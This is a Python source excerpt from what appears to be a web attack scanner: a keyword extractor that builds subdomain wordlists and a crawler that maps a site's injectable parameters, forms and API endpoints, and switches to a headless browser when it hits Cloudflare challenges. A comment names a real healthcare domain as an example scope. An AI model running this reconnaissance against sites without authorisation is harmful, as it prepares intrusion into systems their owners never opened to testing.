        """Extract server, platform hints from response headers."""
        for k, v in headers.items():
            if k.lower() in ("server","x-powered-by","x-generator","via","x-served-by"):
                for part in self.RE_SLUG.split(v.lower()):
                    self._add_word(part, weight=1)

    def _add_text(self, text: str, weight: int = 1):
        """Tokenise free text into words."""
        words = re.findall(r'[a-zA-Z][a-zA-Z0-9]{2,29}', text)
        for w in words:
            # Split camelCase
            for part in self.RE_CAMEL.split(w):
                self._add_word(part.lower(), weight)

    def _add_url_path(self, path: str, weight: int = 1):
        """Extract meaningful segments from a URL path."""
        for m in self.RE_PATH_SEG.finditer(path):
            seg = m.group(1).lower()
            # Split by hyphens/underscores
            for part in self.RE_SLUG.split(seg):
                self._add_word(part, weight)

    def _add_word(self, word: str, weight: int = 1):
        word = word.strip().lower()
        if (self.MIN_LEN <= len(word) <= self.MAX_LEN and
                word not in self.STOP_WORDS and
                re.match(r'^[a-z][a-z0-9\-]*[a-z0-9]$', word) and
                not word.isdigit()):
            self._scored[word] = self._scored.get(word, 0) + weight

    def build_wordlist(self, min_frequency: int = 1,
                        max_words: int = 10000,
                        merge_with_builtin: bool = True) -> List[str]:
        """
        Return the final wordlist, sorted by frequency (most-seen first).
        High-frequency words from THIS site appear before generic ones.
        """
        # Filter and sort by score
        site_words = sorted(
            [(w, s) for w, s in self._scored.items() if s >= min_frequency],
            key=lambda x: x[1], reverse=True)

        result = [w for w, _ in site_words[:max_words]]

        if merge_with_builtin:
            # Append built-in words not already in result
            existing = set(result)
            for w in DNS_WORDLIST_BUILTIN:
                if w not in existing:
                    result.append(w)

        LOG.info(f"KeywordExtractor: {len(self._scored)} raw keywords  "
                 f"{len(result)} wordlist entries "
                 f"({len(site_words)} site-specific)")
        return result

    @property
    def top_keywords(self) -> List[Tuple[str, int]]:
        return sorted(self._scored.items(), key=lambda x: x[1], reverse=True)[:50]


# 
# COMPREHENSIVE CRAWLER   finds every link, parameter, and data surface
# 

@dataclass
class CrawlResult:
    url:          str
    method:       str
    params:       Dict[str, str]
    source:       str
    content_type: str = ""
    depth:        int = 0
    response_code:int = 200
    keywords_extracted: bool = False
    data:         Optional[str] = None

class ComprehensiveCrawler:
    """
    Best-in-class crawler that finds every injectable surface:

    Discovery methods:
      1.  HTML links (a, area, base)
      2.  HTML forms (action URLs, input/select/textarea params)
      3.  Inline JavaScript string analysis (fetch/axios/XHR)
      4.  URL params in all href/src/action/data-* attributes
      5.  CSS @import and url() references
      6.  Sitemap.xml (all loc entries, recursive sitemap indexes)
      7.  robots.txt (all Allow/Disallow paths)
      8.  JavaScript source maps (unminify  more endpoints)
      9.  OpenAPI/Swagger auto-discovery and parsing
      10. GraphQL introspection
      11. .well-known/* discovery
      12. HTTP Link headers (rel=alternate, rel=api, rel=service-desc)
      13. HTTP Location headers (follows redirects, notes dest URL)
      14. HTML <link> tags (rel=alternate, rel=canonical, rel=prev/next)
      15. HTML data-* attribute URLs
      16. HTML meta refresh URLs
      17. JSON response keyendpoint heuristics
      18. WebSocket upgrade detection
      19. gRPC-Web endpoint detection
      20. Email address domains (for subdomain hints)
      21. Playwright deep crawl for JS-rendered content

    All discovered endpoints fed to KeywordExtractor simultaneously.
    """

    # Sources to try for standard files
    STANDARD_PATHS = [
        "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
        "/swagger.json", "/swagger/v1/swagger.json",
        "/api-docs", "/api-docs.json", "/openapi.json", "/openapi.yaml",
        "/v1", "/v2", "/v3", "/api", "/api/v1", "/api/v2", "/graphql",
        "/health", "/healthz", "/ping", "/status",
    ]

    # HTML attributes that can contain URLs
    URL_ATTRIBUTES = [
        ("a",       "href"),
        ("area",    "href"),
        ("base",    "href"),
        ("link",    "href"),
        ("script",  "src"),
        ("img",     "src"),
        ("iframe",  "src"),
        ("embed",   "src"),
        ("object",  "data"),
        ("form",    "action"),
        ("input",   "formaction"),
        ("button",  "formaction"),
        ("source",  "src"),
        ("track",   "src"),
        ("video",   "poster"),
        ("blockquote","cite"),
        ("q",       "cite"),
        ("del",     "cite"),
        ("ins",     "cite"),
        ("meta",    "content"),
    ]

    # JS patterns that reveal API endpoints
    JS_ENDPOINT_PATTERNS = [
        (r'''(?:fetch|axios\.(?:get|post|put|patch|delete))\s*\(\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''url\s*:\s*['"`]([^'"`]{4,100})['"`]''', 1),
        (r'''endpoint\s*:\s*['"`]([^'"`]{4,100})['"`]''', 1),
        (r'''baseURL\s*:\s*['"`]([^'"`]{4,100})['"`]''', 1),
        (r'''path\s*:\s*['"`](/[^'"`]{1,80})['"`]''', 1),
        (r'''route\s*:\s*['"`]([^'"`]{4,80})['"`]''', 1),
        (r'''XMLHttpRequest.*?open\s*\(\s*['"][A-Z]+['"],\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''\$\.(?:ajax|get|post)\s*\(\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''axios\s*\(\s*\{[^}]*url\s*:\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''(?:GET|POST|PUT|PATCH|DELETE)\s+(/[a-zA-Z0-9/_\-{}.?=&]+)''', 1),
        (r'''['"`](/api/[a-zA-Z0-9/_\-{}.?=&]{3,80})['"`]''', 1),
        (r'''['"`](https?://[a-zA-Z0-9._/\-?=&]{10,150})['"`]''', 1),
        (r'''require\s*\(\s*['"`]([^'"`]+)['"`]\s*\)''', 1),
        (r'''import\s+.*?\s+from\s+['"`]([^'"`]+)['"`]''', 1),
        (r'''history\.push(?:State)?\s*\([^,]+,\s*[^,]+,\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''router\.(?:get|post|put|patch|delete|use)\s*\(\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''app\.(?:get|post|put|patch|delete|use)\s*\(\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''@(?:Get|Post|Put|Patch|Delete|RequestMapping)\s*\(\s*['"`]([^'"`]+)['"`]''', 1),
        (r'''path\s*=\s*['"`]([^'"`]{4,80})['"`]''', 1),
        (r'''"(\/[a-zA-Z0-9\/_\-{}.]{3,60})"''', 1),
    ]

    def __init__(self, engine: HTTPEngine, config: Config,
                 keyword_extractor: KeywordExtractor = None,
                 playwright_crawler: Optional[PlaywrightCrawler] = None):
        self.engine       = engine
        self.config       = config
        self.kw_extractor = keyword_extractor or KeywordExtractor()
        self.playwright   = playwright_crawler
        self._visited:    Set[str] = set()
        self._queue:      List[Tuple[str, int]] = []   # (url, depth)
        self._results:    List[CrawlResult] = []
        self._all_urls:   Set[str] = set()
        self._js_files:   Set[str] = set()

    async def crawl(self, start_url: str,
                    max_pages: int = 200,
                    max_depth: int = 5,
                    scope_host: str = None) -> List[CrawlResult]:
        """
        Full-spectrum crawl returning all injectable CrawlResult objects.
        """
        parsed    = urlparse(start_url)
        _raw_scope = scope_host or parsed.netloc
        # Normalise scope to root domain (strip www. prefix)
        # so api.doctolib.fr, auth.doctolib.fr etc. all pass
        scope = _raw_scope[4:] if _raw_scope.startswith("www.") else _raw_scope
        base_host = f"{parsed.scheme}://{parsed.netloc}"

        LOG.info(f"Comprehensive crawl: {start_url} "
                 f"(max_pages={max_pages} max_depth={max_depth})")

        # When Playwright is available, skip httpx BFS entirely.
        # Playwright handles robots.txt, sitemap, JS rendering, forms, SPA routes.
        # httpx BFS is only used as fallback when Playwright is not available.
        if self.playwright:
            LOG.info("  Playwright mode: browser crawl")
        else:
            # No Playwright  use httpx BFS
            # Phase 0: Standard file discovery (parallel, short timeout)
            LOG.info("  No Playwright  using httpx BFS")
            await self._probe_standard_files(base_host, scope)

        # Phase 1: Seed queue (only used by httpx BFS path)
        if not self.playwright:
            self._queue.append((start_url, 0))

        # Phase 2: BFS crawl (httpx  skipped when Playwright available)
        pages_done = 0
        _cf_detected = False
        _crawl_timeout = min(getattr(self.config, "timeout", 30), 10)
        if not self.playwright:
            LOG.info(f"  BFS starting  httpx timeout={_crawl_timeout}s per page")
        while not self.playwright and self._queue and pages_done < max_pages:
            url, depth = self._queue.pop(0)
            norm = self._normalise(url)
            if norm in self._visited or depth > max_depth:
                continue
            self._visited.add(norm)
            _url_host = urlparse(url).netloc
            if scope not in _url_host and not _url_host.endswith('.' + scope):
                continue

            # Early exit: CF already confirmed blocking httpx
            if _cf_detected and self.playwright:
                LOG.info("  CF blocking httpx  jumping to Playwright phase")
                break

            LOG.info(f"  [httpx] Fetching ({pages_done+1}/{max_pages}): {url[:80]}")
            try:
                fp = await asyncio.wait_for(
                    self.engine.send("GET", url),
                    timeout=_crawl_timeout)
                pages_done += 1
                self._all_urls.add(url)
                ct = (getattr(fp, "headers", {}) or {}).get("content-type","")
                body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")

                # Extract HTTP Link headers
                link_header = (getattr(fp, "headers", {}) or {}).get("link","")
                if link_header:
                    for lurl in re.findall(r'<([^>]+)>', link_header):
                        self._enqueue(self._resolve(lurl, base_host, url), depth+1, scope)

                # Feed keywords
                if "html" in ct or "javascript" in ct:
                    self.kw_extractor.ingest_html(body, url)
                    self.kw_extractor.ingest_response_headers(fp.headers)

                # Dispatch by content type
                # Detect Cloudflare challenge  skip HTML processing,
                # queue for Playwright if available
                _is_cf_challenge = (
                    _get_safe_status_code(fp) in (403, 503, 429) or
                    any(kw in body[:2000].lower() for kw in
                        ("just a moment", "cf-browser-verification",
                         "challenge-platform", "ray id",
                         "__cf_chl", "checking your browser")))
                if _is_cf_challenge:
                    _cf_detected = True
                    LOG.info(f"  [CF] Cloudflare challenge at {url}")
                    LOG.info("  Switching to Playwright for remaining pages")
                    self._queue.clear()   # stop httpx BFS entirely
                elif "html" in ct or not ct:
                    await self._process_html(body, url, base_host, scope, depth, fp)
                elif "javascript" in ct:
                    await self._process_js(body, url, base_host, scope, depth)
                elif "json" in ct:
                    await self._process_json(body, url, fp)
                elif "xml" in ct or "text/xml" in ct:
                    await self._process_xml(body, url, base_host, scope, depth)
                elif "css" in ct:
                    await self._process_css(body, url, base_host, scope, depth)

                if pages_done % 10 == 0 or pages_done <= 3:
                    LOG.info(f"  Crawl: {pages_done}/{max_pages} pages | "
                             f"{len(self._results)} endpoints | "
                             f"{len(self._js_files)} JS files | "
                             f"queue={len(self._queue)}")

            except (asyncio.TimeoutError, TimeoutError):
                LOG.info(f"  [timeout] {url[:60]}  skipping (>{_crawl_timeout}s)")
            except Exception as e:
                LOG.debug(f"  Crawl page error {url}: {e}")

        # Phase 3: Playwright deep crawl (JS-rendered content)
        if self.playwright:
            LOG.info("")
            LOG.info("Playwright deep crawl starting")
            LOG.info(f"  Workers: {getattr(self.playwright, 'concurrency', 3)} | "
                     f"Max pages: {max_pages} | Scope: {scope}")
            try:
                pw_requests = await self.playwright.crawl(
                    start_url, max_pages=max_pages,
                    max_depth=max_depth, scope_host=scope)
                for req in pw_requests:
                    # Collect JS file URLs from Playwright interception
                    if req.resource_type == "script" and req.url:
                        _js_h = urlparse(req.url).netloc
                        if scope in _js_h or _js_h.endswith('.' + scope):
                            self._js_files.add(req.url)
                    if req.params:
                        self._results.append(CrawlResult(
                            url=req.url, method=req.method,
                            params=req.params, source="playwright",
                            content_type="application/json" if (req.body or "").strip().startswith("{") else "text/html",
                        ))
                _pw_js = getattr(self.playwright, "_js_files", set())
                self._js_files.update(_pw_js)
                LOG.info(f"Playwright added {len(pw_requests)} requests, "
                         f"{len(_pw_js)} JS files transferred")
            except Exception as e:
                LOG.warning(f"Playwright crawl error: {e}")

        # Phase 4: Fetch all discovered JS files for deeper analysis
        await self._crawl_js_files(base_host, scope)

        unique = self._deduplicate(self._results)
        LOG.info(f"Crawl complete: {pages_done} pages, {len(unique)} injectable endpoints, "
                 f"top keywords: {[w for w,_ in self.kw_extractor.top_keywords[:10]]}")
        return unique

    async def _probe_standard_files(self, base_host: str, scope: str):
        """Parallel probe of standard well-known paths."""
        sem = asyncio.Semaphore(15)
        async def probe(path: str):
            async with sem:
                url = f"{base_host}{path}"
                try:
                    fp = await asyncio.wait_for(
                        self.engine.send("GET", url), timeout=8)
                    if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) < 404:
                        ct   = (getattr(fp, "headers", {}) or {}).get("content-type","")
                        body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
                        LOG.debug(f"  Standard: {url} [{fp.status_code}]")
                        self._queue.append((url, 0))
                        # Parse robots/sitemap immediately
                        if "robots" in path:
                            self.kw_extractor.ingest_robots(body)
                        elif "sitemap" in path and "xml" in ct:
                            await self._process_xml(body, url, base_host, scope, 0)
                        elif path in ("/swagger.json","/openapi.json","/api-docs"):
                            eps = self._parse_openapi(body, base_host)
                            self._results.extend(eps)
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in probe: %s", _sqr_e)
        await asyncio.gather(*[probe(p) for p in self.STANDARD_PATHS], return_exceptions=True)

    async def _process_html(self, html: str, url: str, base_host: str,
                             scope: str, depth: int, fp: ResponseFingerprint):
        """Extract all links, forms, data-* URLs, meta refresh from HTML."""

        # All URL-bearing attributes
        for tag, attr in self.URL_ATTRIBUTES:
            pattern = rf'<{tag}[^>]*\s{attr}=["\']([^"\']+)["\']'
            for m in re.finditer(pattern, html, re.I):
                resolved = self._resolve(m.group(1), base_host, url)
                if resolved:
                    self._enqueue(resolved, depth+1, scope)
                    # If parameterised, add as endpoint
                    if "?" in resolved:
                        params = ParameterParser.from_url(resolved)
                        if params:
                            self._results.append(CrawlResult(
                                url=resolved, method="GET",
                                params=params, source="url_param",
                                depth=depth))
                    elif re.search(r'/(?:api|v\d+|rest|graphql)/', resolved):
                        # API-style path: extract numeric/slug segments
                        segs = [s for s in urlparse(resolved).path.split("/")
                                if s and re.match(r'^[\w\-]{1,40}$', s)
                                and not s.startswith("v") or s.isdigit()]
                        if segs:
                            path_params = {f"seg{i}": s
                                          for i,s in enumerate(segs[-3:])}
                            self._results.append(CrawlResult(
                                url=resolved, method="GET",
                                params=path_params, source="api_path",
                                depth=depth))

        # data-* attributes that look like URLs
        for m in re.finditer(r'data-[a-z\-]+=["\']([^"\']*(?:url|href|endpoint|action)[^"\']*)["\']',
                              html, re.I):
            resolved = self._resolve(m.group(1), base_host, url)
            if resolved: self._enqueue(resolved, depth+1, scope)

        # Meta refresh
        for m in re.finditer(r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\'][^;]*;\s*url=([^"\']+)["\']',
                              html, re.I):
            self._enqueue(self._resolve(m.group(1), base_host, url), depth+1, scope)

        # Forms
        for form_m in re.finditer(r'<form([^>]*)>(.*?)</form>', html, re.I | re.S):
            attrs  = form_m.group(1)
            fbody  = form_m.group(2)
            action = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            meth_m = re.search(r'method=["\']([^"\']*)["\']', attrs, re.I)
            action_url = self._resolve(
                action.group(1) if action else url, base_host, url) or url
            method = (meth_m.group(1).upper() if meth_m else "GET")
            params: Dict[str,str] = {}

            for inp in re.finditer(r'<(input|select|textarea)([^>]*)>', fbody, re.I):
                iattrs = inp.group(2)
                name_m = re.search(r'name=["\']([^"\']+)["\']', iattrs, re.I)
                val_m  = re.search(r'value=["\']([^"\']*)["\']', iattrs, re.I)
                type_m = re.search(r'type=["\']([^"\']+)["\']', iattrs, re.I)
                if name_m:
                    itype = (type_m.group(1).lower() if type_m else "text")
                    if itype not in ("submit","button","image","reset","file"):
                        params[name_m.group(1)] = val_m.group(1) if val_m else ""

            if params:
                self._results.append(CrawlResult(
                    url=action_url, method=method, params=params,
                    source="form", depth=depth, response_code=fp.status_code))

        # Inline JS extraction
        for js_m in re.finditer(r'<script[^>]*>(.*?)</script>', html, re.I | re.S):
            self._extract_js_endpoints(js_m.group(1), url, base_host, scope, depth)

        # External JS file references
        for src_m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I):
            js_url = self._resolve(src_m.group(1), base_host, url)
            if js_url:
                self._js_files.add(js_url)  # collect all JS, filter at analysis

        # GraphQL detection
        if any(kw in html.lower() for kw in ("graphql","__schema","query{","mutation{")):
            gql_url = f"{base_host}/graphql"
            self._queue.append((gql_url, depth+1))

        # WebSocket detection
        for m in re.finditer(r'''new WebSocket\s*\(\s*['"`]([^'"`]+)['"`]''', html):
            LOG.info(f"WebSocket endpoint: {m.group(1)}")

    def _extract_js_endpoints(self, js: str, url: str, base_host: str,
                               scope: str, depth: int):
        """Extract API endpoints from JavaScript."""
        for pattern, group in self.JS_ENDPOINT_PATTERNS:
            for m in re.finditer(pattern, js, re.I | re.S):
                raw = m.group(group).strip()
                resolved = self._resolve(raw, base_host, url)
                if not resolved:
                    continue
                if scope not in urlparse(resolved).netloc:
                    continue
                self._enqueue(resolved, depth+1, scope)
                # Parameterised URLs
                if "?" in resolved:
                    params = ParameterParser.from_url(resolved)
                    if params:
                        self._results.append(CrawlResult(
                            url=resolved, method="GET", params=params,
                            source="js_endpoint", depth=depth))
        # Also feed JS to keyword extractor
        self.kw_extractor.ingest_js(js)

    async def _process_js(self, js: str, url: str, base_host: str,
                           scope: str, depth: int):
        """Process a standalone JS file."""
        self._extract_js_endpoints(js, url, base_host, scope, depth)
        self.kw_extractor.ingest_js(js)

        # Source map check
        if (js or "").strip().endswith("//# sourceMappingURL="):
            pass  # Could follow source maps here

    async def _process_json(self, body: str, url: str, fp: ResponseFingerprint):
        """Extract params from JSON API responses."""
        self.kw_extractor.ingest_json(body)
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                params = {k: str(v)[:100] for k, v in data.items()
                          if isinstance(v, (str, int, float, bool))}
                if params:
                    self._results.append(CrawlResult(
                        url=url, method="GET", params=params,
                        source="json_response", content_type="application/json"))
        except Exception as _sqr_e:
            LOG.debug("Suppressed in _process_json: %s", _sqr_e)

    async def _process_xml(self, body: str, url: str, base_host: str,
                            scope: str, depth: int):
        """Parse sitemap XML and feed keywords."""
        self.kw_extractor.ingest_sitemap(body)
        # Sitemap index  recurse
        for loc in re.findall(r'<loc>\s*(.*?)\s*</loc>', body, re.I | re.S):
            loc = (loc or "").strip()
            if loc.endswith(".xml") and scope in urlparse(loc).netloc:
                try:
                    fp2 = await asyncio.wait_for(
                        self.engine.send("GET", loc), timeout=5)
                    b2  = _safe_decode_body(fp2, encoding="utf-8", errors='replace', func_name='extraction_fp2')
                    # Only recurse 1 level deep
                    if depth < 1:
                        await self._process_xml(
                            b2, loc, base_host, scope, depth+1)
                    else:
                        self.kw_extractor.ingest_sitemap(b2)
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in _process_xml: %s", _sqr_e)
            else:
                self._enqueue(loc, depth+1, scope)

    async def _process_css(self, css: str, url: str, base_host: str,
                            scope: str, depth: int):
        """Extract URLs from CSS @import and url() references."""
        for m in re.finditer(r'''url\s*\(\s*['"]?([^'")]+)['"]?\s*\)''', css, re.I):
            resolved = self._resolve(m.group(1), base_host, url)
            if resolved: self._enqueue(resolved, depth+1, scope)
        for m in re.finditer(r'''@import\s+['"]([^'"]+)['"]''', css, re.I):
            resolved = self._resolve(m.group(1), base_host, url)
            if resolved: self._enqueue(resolved, depth+1, scope)

    async def _crawl_js_files(self, base_host: str, scope: str):
        """Fetch and analyse all discovered external JS files."""
        LOG.info(f"Processing {len(self._js_files)} JS files")
        sem = asyncio.Semaphore(10)
        async def fetch_js(js_url: str):
            async with sem:
                try:
                    fp = await self.engine.send("GET", js_url)
                    if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) != 200: return
                    body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
                    # Mine endpoints from ALL JS, but only add in-scope ones
                    self._extract_js_endpoints(body, js_url, base_host, scope, 99)
                    # Also feed keywords from CDN-hosted JS
                    self.kw_extractor.ingest_html(body, js_url)
                except Exception as _sqr_e:
                    LOG.debug("Suppressed in fetch_js: %s", _sqr_e)
        # Prioritise same-domain JS first, CDN JS after
        same_domain = [u for u in self._js_files
                       if scope in urlparse(u).netloc or
                       urlparse(u).netloc.endswith("." + scope)]
        other_js    = [u for u in self._js_files if u not in same_domain]
        ordered_js  = same_domain + other_js
        await asyncio.gather(*[fetch_js(u) for u in ordered_js], return_exceptions=True)

    def _parse_openapi(self, body: str, base_host: str) -> List[CrawlResult]:
        """Parse OpenAPI spec into CrawlResult objects."""
        results: List[CrawlResult] = []
        try:
            spec = json.loads(body) if body.strip().startswith("{") else {}
            paths = spec.get("paths", {})
            server = base_host
            for srv in spec.get("servers",[]):
                url = srv.get("url","")
                if url.startswith("http"): server = url.rstrip("/"); break
            for path, methods in paths.items():
                for method, details in methods.items():
                    if method.upper() not in ("GET","POST","PUT","PATCH","DELETE"): continue
                    params: Dict[str,str] = {}
                    for p in details.get("parameters",[]):
                        if p.get("in") in ("query","path","formData","body"):
                            params[p.get("name","x")] = str(
                                p.get("schema",{}).get("example","1"))
                    if params:
                        results.append(CrawlResult(
                            url=f"{server}{path}", method=method.upper(),
                            params=params, source="openapi",
                            content_type="application/json"))
        except Exception as _sqr_e:
            LOG.debug("Suppressed in _parse_openapi: %s", _sqr_e)
        return results

    def _enqueue(self, url: Optional[str], depth: int, scope: str):
        if url and scope in urlparse(url).netloc:
            norm = self._normalise(url)
            if norm not in self._visited:
                self._queue.append((url, depth))

    def _resolve(self, href: str, base_host: str, current_url: str) -> Optional[str]:
        if not href or href.startswith(("javascript:","mailto:","tel:","data:","#",
                                        "void","blob:")):
            return None
        href = href.strip()
        if href.startswith("//"): return "https:" + href
        if href.startswith("/"): return base_host + href
        if href.startswith("http"): return href
        base = current_url.rsplit("/", 1)[0]
        return f"{base}/{href}"

    def _normalise(self, url: str) -> str:
        p = urlparse(url)
        # Sort query params for deduplication
        qs = sorted(parse_qs(p.query).items())
        return f"{p.scheme}://{p.netloc}{p.path}?" + urlencode(
            {k: v[0] for k,v in qs}, safe="") if qs else f"{p.scheme}://{p.netloc}{p.path}"

    def _deduplicate(self, results: List[CrawlResult]) -> List[CrawlResult]:
        seen: Set[str] = set()
        out  = []
        for r in results:
            key = f"{r.method}:{self._normalise(r.url)}:{sorted(r.params.keys())}"
            if key not in seen:
                seen.add(key); out.append(r)
        return out


